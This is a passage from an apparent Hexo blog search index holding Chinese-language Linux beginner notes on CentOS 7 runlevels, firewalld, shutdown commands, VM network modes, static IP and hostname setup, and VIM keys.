无法觉得开启是否启动，依赖其他进程、服务</span></span><br><span class="line">shutdown.target                               static  </span><br></pre></td></tr></table></figure><h1 id="六：系统运行级别"><a href="#六：系统运行级别" class="headerlink" title="六：系统运行级别"></a>六：系统运行级别</h1><h2 id="6-1-介绍"><a href="#6-1-介绍" class="headerlink" title="6.1 介绍"></a>6.1 介绍</h2><p><img src="/blog/3de350d3.html/image-20221203195001223.png"></p><ul><li>CenOS 7 运行级别简化为：<ul><li>multi-user.target：运行级别3（多用户有网，无图形界面）</li><li>graphical.target：运行级别5（多用户有网，有图形界面）</li></ul></li></ul><h2 id="6-2-命令"><a href="#6-2-命令" class="headerlink" title="6.2 命令"></a>6.2 命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前运行级别</span></span><br><span class="line">[root@hadoop100 ~]# systemctl get-default </span><br><span class="line">graphical.target</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改运行级别</span></span><br><span class="line">systemctl set-default graphical/multi-user</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">或者 init 3  or init 5</span></span><br></pre></td></tr></table></figure><h1 id="七：防火墙设置"><a href="#七：防火墙设置" class="headerlink" title="七：防火墙设置"></a>七：防火墙设置</h1><h2 id="7-1-操作指令"><a href="#7-1-操作指令" class="headerlink" title="7.1 操作指令"></a>7.1 操作指令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置文件</span></span><br><span class="line">vim /etc/firewalld/firewalld.conf </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启防火墙</span></span><br><span class="line">[root@hadoop100 ~]# systemctl restart firewalld.service </span><br><span class="line">[root@hadoop100 ~]# systemctl status firewalld.service </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭开机自启</span></span><br><span class="line">[root@hadoop100 ~]# systemctl disable firewalld.service </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启用开机自启</span></span><br><span class="line">[root@hadoop100 ~]# systemctl enable firewalld.service </span><br></pre></td></tr></table></figure><h2 id="7-2-实例"><a href="#7-2-实例" class="headerlink" title="7.2 实例"></a>7.2 实例</h2><p>vendor preset: enabled，供应商预设开机自启；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# systemctl status firewalld.service </span><br><span class="line">● firewalld.service - firewalld - dynamic firewall daemon</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; vendor preset: enabled)</span><br><span class="line">   Active: active (running) since 六 2022-12-03 20:21:56 CST; 2min 42s ago</span><br><span class="line">     Docs: man:firewalld(1)</span><br><span class="line"> Main PID: 693 (firewalld)</span><br><span class="line">    Tasks: 2</span><br><span class="line">   CGroup: /system.slice/firewalld.service</span><br><span class="line">           └─693 /usr/bin/python2 -Es /usr/sbin/firewalld --nofork --nopid</span><br><span class="line"></span><br><span class="line">12月 03 20:21:56 hadoop100 systemd[1]: Starting firewalld - dynamic firewall daemon...</span><br><span class="line">12月 03 20:21:56 hadoop100 systemd[1]: Started firewalld - dynamic firewall daemon.</span><br><span class="line">12月 03 20:21:57 hadoop100 firewalld[693]: WARNING: AllowZoneDrifting is enabled. This is considered an insecure configuratio...it now.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure><h1 id="八：关机重启命令"><a href="#八：关机重启命令" class="headerlink" title="八：关机重启命令"></a>八：关机重启命令</h1><h2 id="8-1-常用关机命令"><a href="#8-1-常用关机命令" class="headerlink" title="8.1 常用关机命令"></a>8.1 常用关机命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sync# 将数据手动存盘，由内存同步到硬盘中</span><br><span class="line">halt# 停机，关闭系统、不断电</span><br><span class="line">poweroff# 关机、断电</span><br><span class="line">reboot# 重启，等同于 shutdown -r now</span><br></pre></td></tr></table></figure><h2 id="8-2-shutdown-命令详解"><a href="#8-2-shutdown-命令详解" class="headerlink" title="8.2 shutdown 命令详解"></a>8.2 shutdown 命令详解</h2><ul><li>shutdown：默认一分钟后关机</li><li>shutdown now：立即关机</li><li>shutdown -c：取消关机</li><li>shutdown 3：三分钟后关机</li><li>shutdown 23:00 定时关机</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 远程登录</title>
      <link href="/blog/2fcd7eb.html/"/>
      <url>/blog/2fcd7eb.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Windows-远程登录"><a href="#一：Windows-远程登录" class="headerlink" title="一：Windows 远程登录"></a>一：Windows 远程登录</h1><p><img src="/blog/2fcd7eb.html/image-20221203181208088.png"></p><h1 id="二：远程工具登录"><a href="#二：远程工具登录" class="headerlink" title="二：远程工具登录"></a>二：远程工具登录</h1><h2 id="2-1-Xshell"><a href="#2-1-Xshell" class="headerlink" title="2.1 Xshell"></a>2.1 Xshell</h2><p>远程终端操作工具；</p><p><img src="/blog/2fcd7eb.html/image-20221203185341175.png"></p><h2 id="2-2-Xftp"><a href="#2-2-Xftp" class="headerlink" title="2.2 Xftp"></a>2.2 Xftp</h2><p>文件上传下载工具；</p><p><img src="/blog/2fcd7eb.html/image-20221203185456884.png"></p><h2 id="2-3-下载地址"><a href="#2-3-下载地址" class="headerlink" title="2.3 下载地址"></a>2.3 下载地址</h2><p><a href="https://www.xshell.com/zh/xshell/">XSHELL - NetSarang Website</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 网络配置</title>
      <link href="/blog/75626fa7.html/"/>
      <url>/blog/75626fa7.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：网络连接测试"><a href="#一：网络连接测试" class="headerlink" title="一：网络连接测试"></a>一：网络连接测试</h1><ul><li>windows：ipconfig</li><li>linux：ifconfig</li><li>采用ping命令，检测网络连通性；</li></ul><h1 id="二：网络连接模式"><a href="#二：网络连接模式" class="headerlink" title="二：网络连接模式"></a>二：网络连接模式</h1><h2 id="2-1-桥接模式"><a href="#2-1-桥接模式" class="headerlink" title="2.1 桥接模式"></a>2.1 桥接模式</h2><p>虚拟机直接连接外部物理网络的模式，主机起到了网桥的作用。这种模式下，虚拟机可以直接访问外部网络，并且对外部网络是可见的。占用IP资源；</p><p><img src="/blog/75626fa7.html/image-20221203165906263.png"></p><h2 id="2-2-NAT模式"><a href="#2-2-NAT模式" class="headerlink" title="2.2 NAT模式"></a>2.2 NAT模式</h2><p>虚拟机和主机构建一个专用网络，并通过虚拟网络地址转换（NAT）设备对IP进行转换。虚拟机通过共享主机IP可以访问外部网络，但外部网络无法访问虚拟机。</p><p>PC主机也属于外部网络设备，如何解决自己的PC机访问虚拟机呢？</p><p>VMware 在我们的PC机上虚拟了网卡，通过它我们与虚拟机进行网络通信。</p><p>图解：</p><p><img src="/blog/75626fa7.html/image-20221203165113113.png"></p><h2 id="2-3-仅主机模式"><a href="#2-3-仅主机模式" class="headerlink" title="2.3 仅主机模式"></a>2.3 仅主机模式</h2><p>虚拟机只与主机共享一个专用网络，与外部网络无法通信。</p><p><img src="/blog/75626fa7.html/image-20221203165215099.png"></p><h1 id="三：修改静态-IP"><a href="#三：修改静态-IP" class="headerlink" title="三：修改静态 IP"></a>三：修改静态 IP</h1><h2 id="3-1-查看当前-IP-配置信息"><a href="#3-1-查看当前-IP-配置信息" class="headerlink" title="3.1 查看当前 IP 配置信息"></a>3.1 查看当前 IP 配置信息</h2><p>使用的网卡：ens33</p><p>使用的IP：172.16.80.128</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# ifconfig</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前正在使用的网卡</span></span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.80.128  netmask 255.255.255.0  broadcast 172.16.80.255</span><br><span class="line">        inet6 fe80::e4c4:6675:18b7:2a07  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:2f:4b:6c  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 472392  bytes 666108098 (635.2 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 221586  bytes 13463899 (12.8 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回环</span></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 8  bytes 672 (672.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 8  bytes 672 (672.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">虚拟机内部虚拟的网卡</span></span><br><span class="line">virbr0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line">        ether 52:54:00:cb:22:09  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><h2 id="3-2-修改-IP"><a href="#3-2-修改-IP" class="headerlink" title="3.2 修改 IP"></a>3.2 修改 IP</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens33 </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改前</span></span><br><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;dhcp&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;83568189-0a43-4b75-ad3b-babee2ade453&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">IPV6_PRIVACY=&quot;no&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改后</span></span><br><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;static&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;yes&quot;</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">NAME=&quot;ens33&quot;</span><br><span class="line">UUID=&quot;83568189-0a43-4b75-ad3b-babee2ade453&quot;</span><br><span class="line">DEVICE=&quot;ens33&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br><span class="line">IPV6_PRIVACY=&quot;no&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置静态IP</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">IP地址</span></span><br><span class="line">IPADDR=172.16.80.100</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">网关</span></span><br><span class="line">GATEWAY=172.16.80.2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">域名解析器</span></span><br><span class="line">DNS1=172.16.80.2</span><br></pre></td></tr></table></figure><h2 id="3-3-重启服务"><a href="#3-3-重启服务" class="headerlink" title="3.3 重启服务"></a>3.3 重启服务</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# service network restart </span><br><span class="line">Restarting network (via systemctl):                        [  确定  ]</span><br></pre></td></tr></table></figure><p>查看当前配置，修改成功；</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# ifconfig</span><br><span class="line">ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.16.80.100  netmask 255.255.0.0  broadcast 172.16.255.255</span><br><span class="line">        inet6 fe80::e4c4:6675:18b7:2a07  prefixlen 64  scopeid 0x20&lt;link&gt;</span><br><span class="line">        ether 00:0c:29:2f:4b:6c  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 472425  bytes 666113613 (635.2 MiB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 221637  bytes 13471275 (12.8 MiB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 8  bytes 672 (672.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 8  bytes 672 (672.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">virbr0: flags=4099&lt;UP,BROADCAST,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 192.168.122.1  netmask 255.255.255.0  broadcast 192.168.122.255</span><br><span class="line">        ether 52:54:00:cb:22:09  txqueuelen 1000  (Ethernet)</span><br><span class="line">        RX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 0  bytes 0 (0.0 B)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br></pre></td></tr></table></figure><h1 id="四：主机名配置"><a href="#四：主机名配置" class="headerlink" title="四：主机名配置"></a>四：主机名配置</h1><h2 id="4-1-修改文件"><a href="#4-1-修改文件" class="headerlink" title="4.1 修改文件"></a>4.1 修改文件</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# hostname</span><br><span class="line">hadoop100</span><br><span class="line">[root@hadoop100 ~]# vim /etc/hostname </span><br><span class="line">[root@hadoop100 ~]# reboot</span><br></pre></td></tr></table></figure><h2 id="4-2-命令修改"><a href="#4-2-命令修改" class="headerlink" title="4.2 命令修改"></a>4.2 命令修改</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# hostnamectl </span><br><span class="line">   Static hostname: hadoop100</span><br><span class="line">         Icon name: computer-vm</span><br><span class="line">           Chassis: vm</span><br><span class="line">        Machine ID: 39df9729a6ec4ccba224bc5857c84886</span><br><span class="line">           Boot ID: a45d9de9a8ab481ca0c95be5c3640020</span><br><span class="line">    Virtualization: vmware</span><br><span class="line">  Operating System: CentOS Linux 7 (Core)</span><br><span class="line">       CPE OS Name: cpe:/o:centos:centos:7</span><br><span class="line">            Kernel: Linux 3.10.0-1160.el7.x86_64</span><br><span class="line">      Architecture: x86-64</span><br><span class="line">[root@hadoop100 ~]# hostnamectl set-hostname spark100</span><br><span class="line">[root@hadoop100 ~]# hostname</span><br><span class="line">spark100</span><br></pre></td></tr></table></figure><h2 id="4-3-配置主机映射文件"><a href="#4-3-配置主机映射文件" class="headerlink" title="4.3 配置主机映射文件"></a>4.3 配置主机映射文件</h2><h3 id="（1）Linux-主机修改"><a href="#（1）Linux-主机修改" class="headerlink" title="（1）Linux 主机修改"></a>（1）Linux 主机修改</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# vim /etc/hosts</span><br><span class="line"></span><br><span class="line">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class="line">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class="line"></span><br><span class="line">172.16.80.100 hadoop100</span><br><span class="line">172.16.80.101 hadoop101</span><br><span class="line">172.16.80.102 hadoop102</span><br><span class="line">172.16.80.103 hadoop103</span><br><span class="line">172.16.80.104 hadoop104</span><br></pre></td></tr></table></figure><h3 id="（2）windows-主机修改"><a href="#（2）windows-主机修改" class="headerlink" title="（2）windows 主机修改"></a>（2）windows 主机修改</h3><p>C:\Windows\System32\drivers\etc\hosts</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">172.16.80.100 hadoop100</span><br><span class="line">172.16.80.101 hadoop101</span><br><span class="line">172.16.80.102 hadoop102</span><br><span class="line">172.16.80.103 hadoop103</span><br><span class="line">172.16.80.104 hadoop104</span><br></pre></td></tr></table></figure><h3 id="（3）检验是否生效"><a href="#（3）检验是否生效" class="headerlink" title="（3）检验是否生效"></a>（3）检验是否生效</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@hadoop100 ~]# ping hadoop100</span><br><span class="line">PING hadoop100 (172.16.80.100) 56(84) bytes of data.</span><br><span class="line">64 bytes from hadoop100 (172.16.80.100): icmp_seq=1 ttl=64 time=0.075 ms</span><br><span class="line">64 bytes from hadoop100 (172.16.80.100): icmp_seq=2 ttl=64 time=0.038 ms</span><br><span class="line">64 bytes from hadoop100 (172.16.80.100): icmp_seq=3 ttl=64 time=0.037 ms</span><br><span class="line">^C</span><br><span class="line">--- hadoop100 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 2001ms</span><br><span class="line">rtt min/avg/max/mdev = 0.037/0.050/0.075/0.017 ms</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\lenovo&gt;ping hadoop100</span><br><span class="line"></span><br><span class="line">正在 Ping hadoop100 [172.16.80.100] 具有 32 字节的数据:</span><br><span class="line">来自 172.16.80.100 的回复: 字节=32 时间&lt;1ms TTL=64</span><br><span class="line">来自 172.16.80.100 的回复: 字节=32 时间=1ms TTL=64</span><br><span class="line">来自 172.16.80.100 的回复: 字节=32 时间=1ms TTL=64</span><br><span class="line"></span><br><span class="line">172.16.80.100 的 Ping 统计信息:</span><br><span class="line">    数据包: 已发送 = 3，已接收 = 3，丢失 = 0 (0% 丢失)，</span><br><span class="line">往返行程的估计时间(以毫秒为单位):</span><br><span class="line">    最短 = 0ms，最长 = 1ms，平均 = 0ms</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-VIM编辑器</title>
      <link href="/blog/13ea15c4.html/"/>
      <url>/blog/13ea15c4.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：VIM-是什么"><a href="#一：VIM-是什么" class="headerlink" title="一：VIM 是什么"></a>一：VIM 是什么</h1><p>VI 是 Unix 操作系统和类 Unix 操作系统中最通用的文本编辑器。</p><p>切换输入法快捷键：super + space；</p><h1 id="二：三种模式"><a href="#二：三种模式" class="headerlink" title="二：三种模式"></a>二：三种模式</h1><ul><li>编辑完成后，返回一般模式，进入命令模式，输入 : w 保存文件；</li><li>若不想保存刚才的修改，直接按 U 回退到编辑之前，相当于撤回操作；</li></ul><h2 id="（1）普通模式"><a href="#（1）普通模式" class="headerlink" title="（1）普通模式"></a>（1）普通模式</h2><ul><li><p>yy：复制当前行</p><ul><li>输入数字，然后按 yy，复制多行；</li><li>按 y ，然后按 $ ，复制光标开始到当前行结尾部分；</li><li>按 y ，然后按 ^ ，复制当前行开始到光标部分；</li><li>按 y ，然后按 w，复制当前单词；</li></ul></li><li><p>p：粘贴</p><ul><li>输入数字，然后按 P，直接粘贴多行；</li></ul></li><li><p>u：回退上一步操作；</p></li><li><p>w：跳到下一个单词；</p></li><li><p>dd：删除当前行</p><ul><li>按 d ，然后按 w，删除当前单词；</li></ul></li><li><p>x：截切当前位字符；</p><ul><li>Shift + x，退格（当前光标之前的部分被删除）；</li></ul></li><li><p>r：替换当前光标处字符；</p><ul><li>Shift + r，替换模式；</li></ul></li><li><p>光标移动</p><ul><li><p>Shift + 4，移动到当前行尾；</p></li><li><p>Shift + 6，移动到当前行头；</p></li><li><p>e，跳到词尾；</p></li><li><p>b，跳到词头；</p></li><li><p>gg 或者 Shift + h，跳到开头；</p></li><li><p>L 或者 G，跳到行尾；</p><ul><li>输入数字，然后按G，跳到指定行；</li></ul></li></ul></li><li><p>命令行：</p><ul><li>set nu：显示行号；</li><li>set nonu：隐藏行号；</li></ul></li></ul><h2 id="（2）插入模式"><a href="#（2）插入模式" class="headerlink" title="（2）插入模式"></a>（2）插入模式</h2><table><thead><tr><th>按键</th><th>功能</th></tr></thead><tbody><tr><td>i</td><td>当前光标前</td></tr><tr><td>a</td><td>当前光标后</td></tr><tr><td>o</td><td>当前光标的下一行</td></tr><tr><td>I</td><td>光标所在行最前</td></tr><tr><td>A</td><td>光标所在行最后</td></tr><tr><td>O</td><td>当前光标的上一行</td></tr></tbody></table><h2 id="（3）命令模式"><a href="#（3）命令模式" class="headerlink" title="（3）命令模式"></a>（3）命令模式</h2><table><thead><tr><th>命令</th><th>功能</th></tr></thead><tbody><tr><td>:noh</td><td>取消高亮显示</td></tr><tr><td>:set nu</td><td>显示行号</td></tr><tr><td>:set nonu</td><td>关闭行号</td></tr><tr><td>:s&#x2F;old&#x2F;new</td><td>替换当前行匹配到的第一个old为new</td></tr><tr><td>:s&#x2F;old&#x2F;new&#x2F;g</td><td>替换当前行匹配到的所有old为new</td></tr><tr><td>:%s&#x2F;old&#x2F;new&#x2F;</td><td>替换文档中每一行匹配到的第一个old为new</td></tr><tr><td>:%s&#x2F;old&#x2F;new&#x2F;g</td><td>替换文档中匹配到的所有old为new</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 文件系统</title>
      <link href="/blog/f525ac74.html/"/>
      <url>/blog/f525ac74.html/</url>
      
        <content type="html"><![CDATA[<h1 id="一：Linux-文件"><a href="#一：Linux-文件" class="headerlink" title="一：Linux 文件"></a>一：Linux 文件</h1><p>Linux 系统中，一切皆文件！</p><h1 id="二：Linux-文件目录"><a href="#二：Linux-文件目录" class="headerlink" title="二：Linux 文件目录"></a>二：Linux 文件目录</h1><h2 id="2-1-文件分区"><a href="#2-1-文件分区" class="headerlink" title="2.1 文件分区"></a>2.1 文件分区</h2><ul><li>&#x2F; ：根目录分区</li><li>&#x2F;boot：引导分区</li><li>swap：虚拟内存分区</li></ul><p>文件系统使用的是xfs（高性能日志文件系统），通过挂载点将目录，指定挂载到硬盘的哪个分区；</p><p>所以Linux的文件目录，实际上是虚拟目录。</p><h2 id="2-2-根目录文件分类"><a href="#2-2-根目录文件分类" class="headerlink" title="2.2 根目录文件分类"></a>2.2 根目录文件分类</h2><p><img src="/blog/f525ac74.html/image-20221203141820689.png"></p><h3 id="（1）超链接目录"><a href="#（1）超链接目录" class="headerlink" title="（1）超链接目录"></a>（1）超链接目录</h3><ul><li><p>bin：二进制目录，执行命令；</p></li><li><p>sbin：系统二进制目录，系统命令；</p></li><li><p>lib：库文件目录，存储的系统动态链接依赖库文件，类似与windows的 system32目录；</p></li><li><p>lib64：64位相关的系统动态链接库文件目录；</p></li><li><p>以上4个文件均链接到的是usr下面的目录；</p></li></ul><h3 id="（2）普通目录"><a href="#（2）普通目录" class="headerlink" 